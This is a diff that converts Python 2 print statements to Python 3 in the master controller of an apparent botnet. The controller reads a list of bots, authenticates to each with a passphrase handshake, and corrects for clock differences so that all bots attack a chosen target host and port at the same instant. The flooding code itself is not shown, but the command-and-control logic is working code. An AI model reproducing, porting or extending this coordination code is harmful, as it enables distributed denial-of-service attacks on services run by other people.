@@ -14,11 +14,11 @@ order to ensure that all Bots attack exactly at the specified time.
 """
 class Master:
    def __init__(self):
-      print 'Initializing Master...\n'
+      print('Initializing Master...\n')
 
       # the time to attack, specifed through the delay [secs] from now
       self.atkTime = Util.getCurrTime() + (timeDelay * 1000) 
-      print 'Attack will occur at:', Util.formatTimeMS(self.atkTime), '\n'
+      print('Attack will occur at:', Util.formatTimeMS(self.atkTime), '\n')
 
       self.targetStr = str(target[0]) + ':' + str(target[1]) 
 
@@ -34,7 +34,7 @@ class Master:
    Read the Bot info from the bots_list.txt file.
    """
    def readBotsFile(self):
-      print 'Reading Bots file...'
+      print('Reading Bots file...')
 
       with open("bots_list.txt") as botsFile:
          for line in botsFile:
@@ -45,11 +45,11 @@ class Master:
    Output the list of Bots
    """
    def outputBots(self):
-      print '\nCurrent Bots (host:port):'
+      print('\nCurrent Bots (host:port):')
       
       for i, bot in enumerate(self.bots):
-         print "%s:%d" % (bot[0], bot[1])
-      print ''
+         print("%s:%d" % (bot[0], bot[1]))
+      print('')
 
    """
    Connect to each Bot, get the time difference, tell the Bot who to attack
@@ -57,22 +57,22 @@ class Master:
    """
    def connectToBots(self):
       for i, bot in enumerate(self.bots):
-         print 'Connecting to Bot @ %s:%d...' % (bot[0], bot[1])
+         print('Connecting to Bot @ %s:%d...' % (bot[0], bot[1]))
          botSocket = socket.socket()
 
          try:
             botSocket.connect((bot[0], bot[1]))
          except socket.error:
-            print 'Unable to connect. Skipping bot.\n'
+            print('Unable to connect. Skipping bot.\n')
             continue
 
-         print 'Connected'
+         print('Connected')
 
          # perform handstake
          Util.send(botSocket, Util.MASTER_PASSPHRASE)
          recvdPassphrase = Util.recieve(botSocket)
          if recvdPassphrase != Util.BOT_PASSPHRASE:
-            print 'Bot @ ' + '%s:%d' % (bot[0], bot[1]) + ' compromised!'
+            print('Bot @ ' + '%s:%d' % (bot[0], bot[1]) + ' compromised!')
             botSocket.close()
             continue
 
@@ -85,9 +85,9 @@ class Master:
          botTime = int(botTime.strip())
          delta = botTime - myTime
 
-         print 'Current time: ' + Util.formatTimeMS(myTime)
-         print 'Bot time: ' + Util.formatTimeMS(botTime)
-         print 'Time difference [ms]: ' + str(delta)
+         print('Current time: ' + Util.formatTimeMS(myTime))
+         print('Bot time: ' + Util.formatTimeMS(botTime))
+         print('Time difference [ms]: ' + str(delta))
 
          # tell the bot the target 
          # if we do not add the delta, then we would notice that some
@@ -96,7 +96,7 @@ class Master:
          Util.send(botSocket, self.targetStr + '@' + \
             str(int(self.atkTime + delta)))
 
-         print 'Bot @ ' + '%s:%d' % (bot[0], bot[1]) + ' is ready to attack!\n'
+         print('Bot @ ' + '%s:%d' % (bot[0], bot[1]) + ' is ready to attack!\n')
 
          botSocket.close()
 
